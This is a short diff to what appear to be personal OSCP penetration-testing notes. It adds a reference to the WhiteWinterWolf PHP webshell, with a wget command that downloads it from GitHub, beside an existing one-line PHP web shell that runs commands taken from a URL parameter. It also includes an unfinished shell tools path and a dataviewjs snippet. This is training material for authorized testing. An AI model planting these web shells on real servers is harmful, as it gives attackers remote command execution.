@@ -16,6 +16,16 @@ which python3 python perl ruby socat script
 <?php system($_GET['cmd']);?>
 ```
 
+WhiteWinterWolf enhanced webshell (WWWShell.php)
+
+```
+wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/refs/heads/master/webshell.php 
+```
+
+```
+cd ~/Desktop/Tools/Shells && 
+```
+
 Visit and modify this URL to execute
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
